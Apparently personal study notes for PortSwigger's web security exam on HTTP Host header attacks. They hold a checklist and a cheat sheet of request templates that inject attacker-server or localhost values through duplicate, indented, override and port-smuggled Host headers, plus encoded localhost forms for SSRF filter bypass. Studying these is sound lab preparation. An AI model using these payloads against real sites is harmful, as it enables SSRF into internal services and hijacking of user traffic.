## Key Terms

```bash
- Param Miner extension
	  -> guess: headers, params, body, everything!
- 
```

## Most important labs

- [1]()

- [2]()

- [3]()

- [4]()


## Metodology

❗ Important: To avoid wasting time during the exam, PortSwigger warns that if an SSRF exists it will always be reachable at **IP-BRUTE-FORCE** on **port 6566**. 

```bash
- Discover allowed headers with Param Miner
- Try Arbitrary Host
- Only local users? 
	  -> localhost
	  -> SSRF (in exam always port 6566)
- Check fir flawed validation -> 
- Inject duplicate host header -> blocked? -> indent.
- Intruder -> !! disable update host to match !! 
- Try absloute path in GET = ignore malicious host
- Try inject in port after port : delimeter   
- 2 request in a single connection
```

## Cheat Sheet

```bash
# ARBITRARY HOST
Host: <VULNERABLE-WEB>:<OUR-SV>||<LOCALHOST-SSRF>
# DUPLICATE HOST / SWITCH ORDER
GET /example HTTP/1.1
Host: <VULNERABLE-WEB>
Host: <OUR-SV>||<LOCALHOST-SSRF>
# MALICIOUS INDENTED <TAB> (TRY MORE TABS) HOST + LEGIT HOST
GET /example HTTP/1.1
	Host: <OUR-SV>||<LOCALHOST-SSRF>         
Host: <VULNERABLE-WEB>
# TRY OTHER HEADERS -> X-Host, X-Forwarded-Server, X-HTTP-Host-Override ... etc
GET /example HTTP/1.1
Host: <VULNERABLE-WEB>
X-Forwarded-Host: <OUR-SV>||<LOCALHOST-SSRF>
# ABSOLUTE PATH = IGNORE HOST 
GET <ABSOLUTE_PATH>            
Host: <OUR-SV>||<LOCALHOST-SSRF>
# IN PORT (MEJORAR)
Host: <VULNERABLE-WEB>:<OUR-SV>||<LOCALHOST-SSRF>
```

> DIFFERENT WAYS TO WRITE LOCALHOST   
``` 
> localhost
> 127.0.0.1  
	in decimal -> 2130706433 
	in binary  -> 01111111.00000000.00000000.00000001
> 127.255.255.255 
    in decimal -> 2147483647
    in binary  -> 01111111.11111111.11111111.11111111
> 127.1
```
